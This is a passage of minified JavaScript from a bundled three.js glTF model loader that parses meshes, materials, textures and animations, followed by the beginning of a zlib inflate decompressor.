0!==t.rotation&&(e.rotation=t.rotation),void 0!==t.scale&&e.repeat.fromArray(t.scale),void 0!==t.texCoord&&console.warn('THREE.GLTFLoader: Custom UV sets in "'+this.name+'" extension not yet supported.'),e.needsUpdate=!0,e},m.prototype=Object.create(Oa.prototype),m.prototype.constructor=m,m.prototype.copySampleValue_=function(e){for(var t=this.resultBuffer,i=this.sampleValues,n=this.valueSize,r=e*n*3+n,o=0;o!==n;o++)t[o]=i[r+o];return t},m.prototype.beforeStart_=m.prototype.copySampleValue_,m.prototype.afterEnd_=m.prototype.copySampleValue_,m.prototype.interpolate_=function(e,t,i,n){for(var r=this.resultBuffer,o=this.sampleValues,a=this.valueSize,s=2*a,c=3*a,l=n-t,h=(i-t)/l,u=h*h,d=u*h,p=e*c,f=p-c,m=-2*d+3*u,v=d-u,g=1-m,y=v-u+h,b=0;b!==a;b++){var w=o[f+b+a],x=o[f+b+s]*l,_=o[p+b+a],M=o[p+b]*l;r[b]=g*w+y*x+m*_+v*M}return r};var v,g=0,y=1,b=2,w=3,x=4,_=5,M=6,S={5120:Int8Array,5121:Uint8Array,5122:Int16Array,5123:Uint16Array,5125:Uint32Array,5126:Float32Array},T={9728:1003,9729:1006,9984:1004,9985:1007,9986:1005,9987:1008},E={33071:1001,33648:1002,10497:1e3},A={SCALAR:1,VEC2:2,VEC3:3,VEC4:4,MAT2:4,MAT3:9,MAT4:16},C={POSITION:"position",NORMAL:"normal",TANGENT:"tangent",TEXCOORD_0:"uv",TEXCOORD_1:"uv2",COLOR_0:"color",WEIGHTS_0:"skinWeight",JOINTS_0:"skinIndex"},P={scale:"scale",translation:"position",rotation:"quaternion",weights:"morphTargetInfluences"},L={CUBICSPLINE:void 0,LINEAR:2301,STEP:2300},R="OPAQUE",k="MASK",O="BLEND",I={"image/png":1023,"image/jpeg":1022};function D(e,t){return"string"!=typeof e||""===e?"":(/^https?:\/\//i.test(t)&&/^\//.test(e)&&(t=t.replace(/(^https?:\/\/[^\/]+).*/i,"$1")),/^(https?:)?\/\//i.test(e)?e:/^data:.*,.*$/i.test(e)?e:/^blob:.*$/i.test(e)?e:t+e)}function z(e,t,i){for(var n in i.extensions)void 0===e[n]&&(t.userData.gltfExtensions=t.userData.gltfExtensions||{},t.userData.gltfExtensions[n]=i.extensions[n])}function F(e,t){void 0!==t.extras&&("object"==typeof t.extras?Object.assign(e.userData,t.extras):console.warn("THREE.GLTFLoader: Ignoring primitive type .extras, "+t.extras))}function N(e,t){if(e.updateMorphTargets(),void 0!==t.weights)for(var i=0,n=t.weights.length;i<n;i++)e.morphTargetInfluences[i]=t.weights[i];if(t.extras&&Array.isArray(t.extras.targetNames)){var r=t.extras.targetNames;if(e.morphTargetInfluences.length===r.length){e.morphTargetDictionary={};for(i=0,n=r.length;i<n;i++)e.morphTargetDictionary[r[i]]=i}else console.warn("THREE.GLTFLoader: Invalid extras.targetNames length. Ignoring names.")}}function j(e){for(var t="",i=Object.keys(e).sort(),n=0,r=i.length;n<r;n++)t+=i[n]+":"+e[i[n]]+";";return t}function U(e){if(e.isInterleavedBufferAttribute){for(var t=e.count,i=e.itemSize,n=e.array.slice(0,t*i),r=0,o=0;r<t;++r)n[o++]=e.getX(r),i>=2&&(n[o++]=e.getY(r)),i>=3&&(n[o++]=e.getZ(r)),i>=4&&(n[o++]=e.getW(r));return new Xe(n,i,e.normalized)}return e.clone()}function V(e,i,n){this.json=e||{},this.extensions=i||{},this.options=n||{},this.cache=new t,this.primitiveCache={},this.textureLoader=new rs(this.options.manager),this.textureLoader.setCrossOrigin(this.options.crossOrigin),this.fileLoader=new Ja(this.options.manager),this.fileLoader.setResponseType("arraybuffer"),"use-credentials"===this.options.crossOrigin&&this.fileLoader.setWithCredentials(!0)}function H(e,t,i){var n=t.attributes,r=[];function o(t,n){return i.getDependency("accessor",t).then((function(t){e.addAttribute(n,t)}))}for(var a in n){var s=C[a]||a.toLowerCase();s in e.attributes||r.push(o(n[a],s))}if(void 0!==t.indices&&!e.index){var c=i.getDependency("accessor",t.indices).then((function(t){e.setIndex(t)}));r.push(c)}return F(e,t),Promise.all(r).then((function(){return void 0!==t.targets?function(e,t,i){for(var n=!1,r=!1,o=0,a=t.length;o<a;o++){if(void 0!==(l=t[o]).POSITION&&(n=!0),void 0!==l.NORMAL&&(r=!0),n&&r)break}if(!n&&!r)return Promise.resolve(e);var s=[],c=[];for(o=0,a=t.length;o<a;o++){var l=t[o];if(n){var h=void 0!==l.POSITION?i.getDependency("accessor",l.POSITION):e.attributes.position;s.push(h)}if(r){h=void 0!==l.NORMAL?i.getDependency("accessor",l.NORMAL):e.attributes.normal;c.push(h)}}return Promise.all([Promise.all(s),Promise.all(c)]).then((function(i){for(var o=i[0],a=i[1],s=0,c=o.length;s<c;s++)e.attributes.position!==o[s]&&(o[s]=U(o[s]));for(s=0,c=a.length;s<c;s++)e.attributes.normal!==a[s]&&(a[s]=U(a[s]));for(s=0,c=t.length;s<c;s++){var l=t[s],h="morphTarget"+s;if(n&&void 0!==l.POSITION){var u=o[s];u.name=h;for(var d=e.attributes.position,p=0,f=u.count;p<f;p++)u.setXYZ(p,u.getX(p)+d.getX(p),u.getY(p)+d.getY(p),u.getZ(p)+d.getZ(p))}if(r&&void 0!==l.NORMAL){var m=a[s];m.name=h;var v=e.attributes.normal;for(p=0,f=m.count;p<f;p++)m.setXYZ(p,m.getX(p)+v.getX(p),m.getY(p)+v.getY(p),m.getZ(p)+v.getZ(p))}}return n&&(e.morphAttributes.position=o),r&&(e.morphAttributes.normal=a),e}))}(e,t.targets,i):e}))}return V.prototype.parse=function(e,t){var i=this,n=this.json,r=this.extensions;this.cache.removeAll(),this.markDefs(),Promise.all([this.getDependencies("scene"),this.getDependencies("animation"),this.getDependencies("camera")]).then((function(t){var o={scene:t[0][n.scene||0],scenes:t[0],animations:t[1],cameras:t[2],asset:n.asset,parser:i,userData:{}};z(r,o,n),F(o,n),e(o)})).catch(t)},V.prototype.markDefs=function(){for(var e=this.json.nodes||[],t=this.json.skins||[],i=this.json.meshes||[],n={},r={},o=0,a=t.length;o<a;o++)for(var s=t[o].joints,c=0,l=s.length;c<l;c++)e[s[c]].isBone=!0;for(var h=0,u=e.length;h<u;h++){var d=e[h];void 0!==d.mesh&&(void 0===n[d.mesh]&&(n[d.mesh]=r[d.mesh]=0),n[d.mesh]++,void 0!==d.skin&&(i[d.mesh].isSkinnedMesh=!0))}this.json.meshReferences=n,this.json.meshUses=r},V.prototype.getDependency=function(e,t){var n=e+":"+t,r=this.cache.get(n);if(!r){switch(e){case"scene":r=this.loadScene(t);break;case"node":r=this.loadNode(t);break;case"mesh":r=this.loadMesh(t);break;case"accessor":r=this.loadAccessor(t);break;case"bufferView":r=this.loadBufferView(t);break;case"buffer":r=this.loadBuffer(t);break;case"material":r=this.loadMaterial(t);break;case"texture":r=this.loadTexture(t);break;case"skin":r=this.loadSkin(t);break;case"animation":r=this.loadAnimation(t);break;case"camera":r=this.loadCamera(t);break;case"light":r=this.extensions[i.KHR_LIGHTS_PUNCTUAL].loadLight(t);break;default:throw new Error("Unknown type: "+e)}this.cache.add(n,r)}return r},V.prototype.getDependencies=function(e){var t=this.cache.get(e);if(!t){var i=this,n=this.json[e+("mesh"===e?"es":"s")]||[];t=Promise.all(n.map((function(t,n){return i.getDependency(e,n)}))),this.cache.add(e,t)}return t},V.prototype.loadBuffer=function(e){var t=this.json.buffers[e],n=this.fileLoader;if(t.type&&"arraybuffer"!==t.type)throw new Error("THREE.GLTFLoader: "+t.type+" buffer type is not supported.");if(void 0===t.uri&&0===e)return Promise.resolve(this.extensions[i.KHR_BINARY_GLTF].body);var r=this.options;return new Promise((function(e,i){n.load(D(t.uri,r.path),e,void 0,(function(){i(new Error('THREE.GLTFLoader: Failed to load buffer "'+t.uri+'".'))}))}))},V.prototype.loadBufferView=function(e){var t=this.json.bufferViews[e];return this.getDependency("buffer",t.buffer).then((function(e){var i=t.byteLength||0,n=t.byteOffset||0;return e.slice(n,n+i)}))},V.prototype.loadAccessor=function(e){var t=this,i=this.json,n=this.json.accessors[e];if(void 0===n.bufferView&&void 0===n.sparse)return Promise.resolve(null);var r=[];return void 0!==n.bufferView?r.push(this.getDependency("bufferView",n.bufferView)):r.push(null),void 0!==n.sparse&&(r.push(this.getDependency("bufferView",n.sparse.indices.bufferView)),r.push(this.getDependency("bufferView",n.sparse.values.bufferView))),Promise.all(r).then((function(e){var r,o=e[0],a=A[n.type],s=S[n.componentType],c=s.BYTES_PER_ELEMENT,l=c*a,h=n.byteOffset||0,u=void 0!==n.bufferView?i.bufferViews[n.bufferView].byteStride:void 0,d=!0===n.normalized;if(u&&u!==l){var p=Math.floor(h/u),f="InterleavedBuffer:"+n.bufferView+":"+n.componentType+":"+p+":"+n.count,m=t.cache.get(f);m||(m=new pr(new s(o,p*u,n.count*u/c),u/c),t.cache.add(f,m)),r=new fr(m,a,h%u/c,d)}else r=new Xe(null===o?new s(n.count*a):new s(o,h,n.count*a),a,d);if(void 0!==n.sparse){var v=A.SCALAR,g=S[n.sparse.indices.componentType],y=n.sparse.indices.byteOffset||0,b=n.sparse.values.byteOffset||0,w=new g(e[1],y,n.sparse.count*v),x=new s(e[2],b,n.sparse.count*a);null!==o&&(r=new Xe(r.array.slice(),r.itemSize,r.normalized));for(var _=0,M=w.length;_<M;_++){var T=w[_];if(r.setX(T,x[_*a]),a>=2&&r.setY(T,x[_*a+1]),a>=3&&r.setZ(T,x[_*a+2]),a>=4&&r.setW(T,x[_*a+3]),a>=5)throw new Error("THREE.GLTFLoader: Unsupported itemSize in sparse BufferAttribute.")}}return r}))},V.prototype.loadTexture=function(e){var t,n=this,r=this.json,o=this.options,a=this.textureLoader,s=window.URL||window.webkitURL,c=r.textures[e],l=c.extensions||{},h=(t=l[i.MSFT_TEXTURE_DDS]?r.images[l[i.MSFT_TEXTURE_DDS].source]:r.images[c.source]).uri,u=!1;return void 0!==t.bufferView&&(h=n.getDependency("bufferView",t.bufferView).then((function(e){u=!0;var i=new Blob([e],{type:t.mimeType});return h=s.createObjectURL(i)}))),Promise.resolve(h).then((function(e){var t=o.manager.getHandler(e);return t||(t=l[i.MSFT_TEXTURE_DDS]?n.extensions[i.MSFT_TEXTURE_DDS].ddsLoader:a),new Promise((function(i,n){t.load(D(e,o.path),i,void 0,n)}))})).then((function(e){!0===u&&s.revokeObjectURL(h),e.flipY=!1,void 0!==c.name&&(e.name=c.name),t.mimeType in I&&(e.format=I[t.mimeType]);var i=(r.samplers||{})[c.sampler]||{};return e.magFilter=T[i.magFilter]||1006,e.minFilter=T[i.minFilter]||1008,e.wrapS=E[i.wrapS]||1e3,e.wrapT=E[i.wrapT]||1e3,e}))},V.prototype.assignTexture=function(e,t,n){var r=this;return this.getDependency("texture",n.index).then((function(o){if(!o.isCompressedTexture)switch(t){case"aoMap":case"emissiveMap":case"metalnessMap":case"normalMap":case"roughnessMap":o.format=1022}if(r.extensions[i.KHR_TEXTURE_TRANSFORM]){var a=void 0!==n.extensions?n.extensions[i.KHR_TEXTURE_TRANSFORM]:void 0;a&&(o=r.extensions[i.KHR_TEXTURE_TRANSFORM].extendTexture(o,a))}e[t]=o}))},V.prototype.assignFinalMaterial=function(e){var t=e.geometry,n=e.material,r=this.extensions,o=void 0!==t.attributes.tangent,a=void 0!==t.attributes.color,s=void 0===t.attributes.normal,c=!0===e.isSkinnedMesh,l=Object.keys(t.morphAttributes).length>0,h=l&&void 0!==t.morphAttributes.normal;if(e.isPoints){var u="PointsMaterial:"+n.uuid,d=this.cache.get(u);d||(d=new Qr,We.prototype.copy.call(d,n),d.color.copy(n.color),d.map=n.map,d.sizeAttenuation=!1,this.cache.add(u,d)),n=d}else if(e.isLine){u="LineBasicMaterial:"+n.uuid;var p=this.cache.get(u);p||(p=new Nr,We.prototype.copy.call(p,n),p.color.copy(n.color),this.cache.add(u,p)),n=p}if(o||a||s||c||l){u="ClonedMaterial:"+n.uuid+":";n.isGLTFSpecularGlossinessMaterial&&(u+="specular-glossiness:"),c&&(u+="skinning:"),o&&(u+="vertex-tangents:"),a&&(u+="vertex-colors:"),s&&(u+="flat-shading:"),l&&(u+="morph-targets:"),h&&(u+="morph-normals:");var f=this.cache.get(u);f||(f=n.isGLTFSpecularGlossinessMaterial?r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].cloneMaterial(n):n.clone(),c&&(f.skinning=!0),o&&(f.vertexTangents=!0),a&&(f.vertexColors=2),s&&(f.flatShading=!0),l&&(f.morphTargets=!0),h&&(f.morphNormals=!0),this.cache.add(u,f)),n=f}n.aoMap&&void 0===t.attributes.uv2&&void 0!==t.attributes.uv&&(console.log("THREE.GLTFLoader: Duplicating UVs to support aoMap."),t.addAttribute("uv2",new Xe(t.attributes.uv.array,2))),n.isGLTFSpecularGlossinessMaterial&&(e.onBeforeRender=r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].refreshUniforms),e.material=n},V.prototype.loadMaterial=function(e){var t,n=this.json,r=this.extensions,o=n.materials[e],a={},s=o.extensions||{},c=[];if(s[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS]){var l=r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS];t=l.getMaterialType(),c.push(l.extendParams(a,o,this))}else if(s[i.KHR_MATERIALS_UNLIT]){var h=r[i.KHR_MATERIALS_UNLIT];t=h.getMaterialType(),c.push(h.extendParams(a,o,this))}else{t=Ma;var u=o.pbrMetallicRoughness||{};if(a.color=new Ne(1,1,1),a.opacity=1,Array.isArray(u.baseColorFactor)){var d=u.baseColorFactor;a.color.fromArray(d),a.opacity=d[3]}void 0!==u.baseColorTexture&&c.push(this.assignTexture(a,"map",u.baseColorTexture)),a.metalness=void 0!==u.metallicFactor?u.metallicFactor:1,a.roughness=void 0!==u.roughnessFactor?u.roughnessFactor:1,void 0!==u.metallicRoughnessTexture&&(c.push(this.assignTexture(a,"metalnessMap",u.metallicRoughnessTexture)),c.push(this.assignTexture(a,"roughnessMap",u.metallicRoughnessTexture)))}!0===o.doubleSided&&(a.side=2);var p=o.alphaMode||R;return p===O?a.transparent=!0:(a.transparent=!1,p===k&&(a.alphaTest=void 0!==o.alphaCutoff?o.alphaCutoff:.5)),void 0!==o.normalTexture&&t!==qe&&(c.push(this.assignTexture(a,"normalMap",o.normalTexture)),a.normalScale=new f(1,1),void 0!==o.normalTexture.scale&&a.normalScale.set(o.normalTexture.scale,o.normalTexture.scale)),void 0!==o.occlusionTexture&&t!==qe&&(c.push(this.assignTexture(a,"aoMap",o.occlusionTexture)),void 0!==o.occlusionTexture.strength&&(a.aoMapIntensity=o.occlusionTexture.strength)),void 0!==o.emissiveFactor&&t!==qe&&(a.emissive=(new Ne).fromArray(o.emissiveFactor)),void 0!==o.emissiveTexture&&t!==qe&&c.push(this.assignTexture(a,"emissiveMap",o.emissiveTexture)),Promise.all(c).then((function(){var e;return e=t===Vt?r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].createMaterial(a):new t(a),void 0!==o.name&&(e.name=o.name),e.map&&(e.map.encoding=3001),e.emissiveMap&&(e.emissiveMap.encoding=3001),e.specularMap&&(e.specularMap.encoding=3001),F(e,o),o.extensions&&z(r,e,o),e}))},V.prototype.loadGeometries=function(e){var t=this,n=this.extensions,r=this.primitiveCache;function o(e){return n[i.KHR_DRACO_MESH_COMPRESSION].decodePrimitive(e,t).then((function(i){return H(i,e,t)}))}for(var a,s,c=[],l=0,h=e.length;l<h;l++){var u,d=e[l],p=(s=void 0,(s=(a=d).extensions&&a.extensions[i.KHR_DRACO_MESH_COMPRESSION])?"draco:"+s.bufferView+":"+s.indices+":"+j(s.attributes):a.indices+":"+j(a.attributes)+":"+a.mode),f=r[p];if(f)c.push(f.promise);else u=d.extensions&&d.extensions[i.KHR_DRACO_MESH_COMPRESSION]?o(d):H(new dt,d,t),r[p]={primitive:d,promise:u},c.push(u)}return Promise.all(c)},V.prototype.loadMesh=function(e){for(var t=this,i=this.json.meshes[e],n=i.primitives,r=[],o=0,a=n.length;o<a;o++){var s=void 0===n[o].material?v=v||new Ma({color:16777215,emissive:0,metalness:1,roughness:1,transparent:!1,depthTest:!0,side:0}):this.getDependency("material",n[o].material);r.push(s)}return Promise.all(r).then((function(r){return t.loadGeometries(n).then((function(o){for(var a=[],s=0,c=o.length;s<c;s++){var l,h=o[s],u=n[s],d=r[s];if(u.mode===x||u.mode===_||u.mode===M||void 0===u.mode)!0!==(l=!0===i.isSkinnedMesh?new Or(h,d):new Lt(h,d)).isSkinnedMesh||l.geometry.attributes.skinWeight.normalized||l.normalizeSkinWeights(),u.mode===_?l.drawMode=1:u.mode===M&&(l.drawMode=2);else if(u.mode===y)l=new Yr(h,d);else if(u.mode===w)l=new Wr(h,d);else if(u.mode===b)l=new Zr(h,d);else{if(u.mode!==g)throw new Error("THREE.GLTFLoader: Primitive mode unsupported: "+u.mode);l=new to(h,d)}Object.keys(l.geometry.morphAttributes).length>0&&N(l,i),l.name=i.name||"mesh_"+e,o.length>1&&(l.name+="_"+s),F(l,i),t.assignFinalMaterial(l),a.push(l)}if(1===a.length)return a[0];var p=new ir;for(s=0,c=a.length;s<c;s++)p.add(a[s]);return p}))}))},V.prototype.loadCamera=function(e){var t,i=this.json.cameras[e],n=i[i.type];if(n)return"perspective"===i.type?t=new Gt(p.radToDeg(n.yfov),n.aspectRatio||1,n.znear||1,n.zfar||2e6):"orthographic"===i.type&&(t=new Bs(n.xmag/-2,n.xmag/2,n.ymag/2,n.ymag/-2,n.znear,n.zfar)),void 0!==i.name&&(t.name=i.name),F(t,i),Promise.resolve(t);console.warn("THREE.GLTFLoader: Missing camera parameters.")},V.prototype.loadSkin=function(e){var t=this.json.skins[e],i={joints:t.joints};return void 0===t.inverseBindMatrices?Promise.resolve(i):this.getDependency("accessor",t.inverseBindMatrices).then((function(e){return i.inverseBindMatrices=e,i}))},V.prototype.loadAnimation=function(e){for(var t=this.json.animations[e],i=[],n=[],r=[],o=[],a=[],s=0,c=t.channels.length;s<c;s++){var l=t.channels[s],h=t.samplers[l.sampler],u=l.target,d=void 0!==u.node?u.node:u.id,p=void 0!==t.parameters?t.parameters[h.input]:h.input,f=void 0!==t.parameters?t.parameters[h.output]:h.output;i.push(this.getDependency("node",d)),n.push(this.getDependency("accessor",p)),r.push(this.getDependency("accessor",f)),o.push(h),a.push(u)}return Promise.all([Promise.all(i),Promise.all(n),Promise.all(r),Promise.all(o),Promise.all(a)]).then((function(i){for(var n=i[0],r=i[1],o=i[2],a=i[3],s=i[4],c=[],l=0,h=n.length;l<h;l++){var u=n[l],d=r[l],p=o[l],f=a[l],v=s[l];if(void 0!==u){var g;switch(u.updateMatrix(),u.matrixAutoUpdate=!0,P[v.path]){case P.weights:g=ja;break;case P.rotation:g=Va;break;case P.position:case P.scale:default:g=Ga}var y=u.name?u.name:u.uuid,b=void 0!==f.interpolation?L[f.interpolation]:2301,w=[];P[v.path]===P.weights?u.traverse((function(e){!0===e.isMesh&&e.morphTargetInfluences&&w.push(e.name?e.name:e.uuid)})):w.push(y);var x=p.array;if(p.normalized){var _;if(x.constructor===Int8Array)_=1/127;else if(x.constructor===Uint8Array)_=1/255;else if(x.constructor==Int16Array)_=1/32767;else{if(x.constructor!==Uint16Array)throw new Error("THREE.GLTFLoader: Unsupported output accessor component type.");_=1/65535}for(var M=new Float32Array(x.length),S=0,T=x.length;S<T;S++)M[S]=x[S]*_;x=M}for(S=0,T=w.length;S<T;S++){var E=new g(w[S]+"."+P[v.path],d.array,x,b);"CUBICSPLINE"===f.interpolation&&(E.createInterpolant=function(e){return new m(this.times,this.values,this.getValueSize()/3,e)},E.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline=!0),c.push(E)}}}return new Wa(void 0!==t.name?t.name:"animation_"+e,void 0,c)}))},V.prototype.loadNode=function(e){var t,n=this.json,r=this.extensions,o=this,a=n.meshReferences,s=n.meshUses,c=n.nodes[e];return(t=[],void 0!==c.mesh&&t.push(o.getDependency("mesh",c.mesh).then((function(e){var t;if(a[c.mesh]>1){var i=s[c.mesh]++;(t=e.clone()).name+="_instance_"+i,t.onBeforeRender=e.onBeforeRender;for(var n=0,r=t.children.length;n<r;n++)t.children[n].name+="_instance_"+i,t.children[n].onBeforeRender=e.children[n].onBeforeRender}else t=e;return void 0!==c.weights&&t.traverse((function(e){if(e.isMesh)for(var t=0,i=c.weights.length;t<i;t++)e.morphTargetInfluences[t]=c.weights[t]})),t}))),void 0!==c.camera&&t.push(o.getDependency("camera",c.camera)),c.extensions&&c.extensions[i.KHR_LIGHTS_PUNCTUAL]&&void 0!==c.extensions[i.KHR_LIGHTS_PUNCTUAL].light&&t.push(o.getDependency("light",c.extensions[i.KHR_LIGHTS_PUNCTUAL].light)),Promise.all(t)).then((function(e){var t;if((t=!0===c.isBone?new zr:e.length>1?new ir:1===e.length?e[0]:new K)!==e[0])for(var i=0,n=e.length;i<n;i++)t.add(e[i]);if(void 0!==c.name&&(t.userData.name=c.name,t.name=Ic.sanitizeNodeName(c.name)),F(t,c),c.extensions&&z(r,t,c),void 0!==c.matrix){var o=new B;o.fromArray(c.matrix),t.applyMatrix(o)}else void 0!==c.translation&&t.position.fromArray(c.translation),void 0!==c.rotation&&t.quaternion.fromArray(c.rotation),void 0!==c.scale&&t.scale.fromArray(c.scale);return t}))},V.prototype.loadScene=function(){function e(t,i,n,r){var o=n.nodes[t];return r.getDependency("node",t).then((function(e){return void 0===o.skin?e:r.getDependency("skin",o.skin).then((function(e){for(var i=[],n=0,o=(t=e).joints.length;n<o;n++)i.push(r.getDependency("node",t.joints[n]));return Promise.all(i)})).then((function(i){return e.traverse((function(e){if(e.isMesh){for(var n=[],r=[],o=0,a=i.length;o<a;o++){var s=i[o];if(s){n.push(s);var c=new B;void 0!==t.inverseBindMatrices&&c.fromArray(t.inverseBindMatrices.array,16*o),r.push(c)}else console.warn('THREE.GLTFLoader: Joint "%s" could not be found.',t.joints[o])}e.bind(new Dr(n,r),e.matrixWorld)}})),e}));var t})).then((function(t){i.add(t);var a=[];if(o.children)for(var s=o.children,c=0,l=s.length;c<l;c++){var h=s[c];a.push(e(h,t,n,r))}return Promise.all(a)}))}return function(t){var i=this.json,n=this.extensions,r=this.json.scenes[t],o=new ee;void 0!==r.name&&(o.name=r.name),F(o,r),r.extensions&&z(n,o,r);for(var a=r.nodes||[],s=[],c=0,l=a.length;c<l;c++)s.push(e(a[c],o,i,this));return Promise.all(s).then((function(){return o}))}}(),e}(),Hp={},Gp=Hp;function Wp(e,t){var i,n=e.split("."),r=Gp;!(n[0]in r)&&r.execScript&&r.execScript("var "+n[0]);for(;n.length&&(i=n.shift());)n.length||void 0===t?r=r[i]?r[i]:r[i]={}:r[i]=t}var qp="undefined"!=typeof Uint8Array&&"undefined"!=typeof Uint16Array&&"undefined"!=typeof Uint32Array&&"undefined"!=typeof DataView;function Xp(e){var t,i,n,r,o,a,s,c,l,h,u=e.length,d=0,p=Number.POSITIVE_INFINITY;for(c=0;c<u;++c)e[c]>d&&(d=e[c]),e[c]<p&&(p=e[c]);for(t=1<<d,i=new(qp?Uint32Array:Array)(t),n=1,r=0,o=2;n<=d;){for(c=0;c<u;++c)if(e[c]===n){for(a=0,s=r,l=0;l<n;++l)a=a<<1|1&s,s>>=1;for(h=n<<16|c,l=a;l<t;l+=o)i[l]=h;++r}++n,r<<=1,o<<=1}return[i,d,p]}function Yp(e,t){switch(this.g=[],this.h=32768,this.d=this.f=this.a=this.l=0,this.input=qp?new Uint8Array(e):e,this.m=!1,this.i=Qp,this.r=!1,!t&&(t={})||(t.index&&(this.a=t.index),t.bufferSize&&(this.h=t.bufferSize),t.bufferType&&(this.i=t.bufferType),t.resize&&(this.r=t.resize)),this.i){case Zp:this.b=32768,this.c=new(qp?Uint8Array:Array)(32768+this.h+258);break;case Qp:this.b=0,this.c=new(qp?Uint8Array:Array)(this.h),this.e=this.z,this.n=this.v,this.j=this.w;break;default:throw Error("invalid inflate mode")}}var Zp=0,Qp=1,$p={t:Zp,s:Qp};Yp.prototype.k=function(){for(;!this.m;){var e=gf(this,3);switch(1&e&&(this.m=!0),e>>>=1){case 0:var t=this.input,i=this.a,n=this.c,r=this.b,o=t.length,a=void 0,s=n.length,c=void 0;if(this.d=this.f=0,i+1>=o)throw Error("invalid uncompressed block header: LEN");if(a=t[i++]|t[i++]<<8,i+1>=o)throw Error("invalid uncompressed block header: NLEN");if(a===~(t[i++]|t[i++]<<8))throw Error("invalid uncompressed block header: length verify");if(i+a>t.length)throw Error("input buffer is broken");switch(this.i){case Zp:for(;r+a>n.length;){if(a-=c=s-r,qp)n.set(t.subarray(i,i+c),r),r+=c,i+=c;else for(;c--;)n[r++]=t[i++];this.b=r,n=this.e(),r=this.b}break;case Qp:for(;r+a>n.length;)n=this.e({p:2});break;default:throw Error("invalid inflate mode")}if(qp)n.set(t.subarray(i,i+a),r),r+=a,i+=a;else for(;a--;)n[r++]=t[i++];this.a=i,this.b=r,this.c=n;break;case 1:this.j(ff,vf);break;case 2:var l,h,u,d,p=gf(this,5)+257,f=gf(this,5)+1,m=gf(this,4)+4,v=new(qp?Uint8Array:Array)(tf.length),g=void 0,y=void 0,b=void 0,w=void 0,x=void 0;for(x=0;x<m;++x)v[tf[x]]=gf(this,3);if(!qp)for(x=m,m=v.length;x<m;++x)v[tf[x]]=0;for(l=Xp(v),g=new(qp?Uint8Array:Array)(p+f),x=0,d=p+f;x<d;)switch(y=yf(this,l),y){case 16:for(w=3+gf(this,2);w--;)g[x++]=b;break;case 17:for(w=3+gf(this,3);w--;)g[x++]=0;b=0;break;case 18:for(w=11+gf(this,7);w--;)g[x++]=0;b=0;break;default:b=g[x++]=y}h=Xp(qp?g.subarray(0,p):g.slice(0,p)),u=Xp(qp?g.subarray(p):g.slice(p)),this.j(h,u);break;default:throw Error("unknown BTYPE: "+e)}}return this.n()};var Jp,Kp,ef=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],tf=qp?new Uint16Array(ef):ef,nf=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,258,258],rf=qp?new Uint16Array(nf):nf,of=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0],af=qp?new Uint8Array(of):of,sf=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],cf=qp?new Uint16Array(sf):sf,lf=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],hf=qp?new Uint8Array(lf):lf,uf=new(qp?Uint8Array:Array)(288);for(Jp=0,Kp=uf.length;Jp<Kp;++Jp)uf[Jp]=143>=Jp?8:255>=Jp?9:279>=Jp?7:8;var df,pf,ff=Xp(uf),mf=new(qp?Uint8Array:Array)(30);for(df=0,pf=mf.length;df<pf;++df)mf[df]=5;var vf=Xp(mf);function gf(e,t){for(var i,n=e.f,r=e.d,o=e.input,a=e.a,s=o.length;r<t;){if(a>=s)throw Error("input buffer is broken");n|=o[a++]<<r,r+=8}return i=n&(1<<t)-1,e.f=n>>>t,e.d=r-t,e.a=a,i}function yf(e,t){for(var i,n,r=e.f,o=e.d,a=e.input,s=e.a,c=a.length,l=t[0],h=t[1];o<h&&!(s>=c);)r|=a[s++]<<o,o+=8;if((n=(i=l[r&(1<<h)-1])>>>16)>o)throw Error("invalid code length: "+n);return e.f=r>>n,e.d=o-n,e.a=s,65535&i}function bf(e,t){var i,n;switch(this.input=e,this.a=0,!t&&(t={})||(t.index&&(this.a=t.index),t.verify&&(this.A=t.verify)),i=e[this.a++],n=e[this.a++],15&i){case wf:this.method=wf;break;default:throw Error("unsupported compression method")}if(0!=((i<<8)+n)%31)throw Error("invalid fcheck flag:"+((i<<8)+n)%31);if(32&n)throw Error("fdict flag is not supported");this.q=new Yp(e,{index:this.a,bufferSize:t.bufferSize,bufferType:t.bufferType,resize:t.resize})}Yp.prototype.j=function(e,t){var i=this.c,n=this.b;this.o=e;for(var r,o,a,s,c=i.length-258;256!==(r=yf(this,e));)if(256>r)n>=c&&(this.b=n,i=this.e(),n=this.b),i[n++]=r;else for(s=rf[o=r-257],0<af[o]&&(s+=gf(this,af[o])),r=yf(this,t),a=cf[r],0<hf[r]&&(a+=gf(this,hf[r])),n>=c&&(this.b=n,i=this.e(),n=this.b);s--;)i[n]=i[n++-a];for(;8<=this.d;)this.d-=8,this.a--;this.b=n},Yp.prototype.w=function(e,t){var i=this.c,n=this.b;this.o=e;for(var r,o,a,s,c=i.length;256!==(r=yf(this,e));)if(256>r)n>=c&&(c=(i=this.e()).length),i[n++]=r;else for(s=rf[o=r-257],0<af[o]&&(s+=gf(this,af[o])),r=yf(this,t),a=cf[r],0<hf[r]&&(a+=gf(this,hf[r])),n+s>c&&(c=(i=this.e()).length);s--;)i[n]=i[n++-a];for(;8<=this.d;)this.d-=8,this.a--;this.b=n},Yp.prototype.e=function(){var e,t,i=new(qp?Uint8Array:Array)(this.b-32768),n=this.b-32768,r=this.c;if(qp)i.set(r.subarray(32768,i.length));else for(e=0,t=i.length;e<t;++e)i[e]=r[e+32768];if(this.g.push(i),this.l+=i.length,qp)r.set(r.subarray(n,n+32768));else for(e=0;32768>e;++e)r[e]=r[n+e];return this.b=32768,r},Yp.prototype.z=function(e){var t,i,n,r=this.input.length/this.a+1|0,o=this.input,a=this.c;return e&&("number"==typeof e.p&&(r=e.p),"number"==typeof 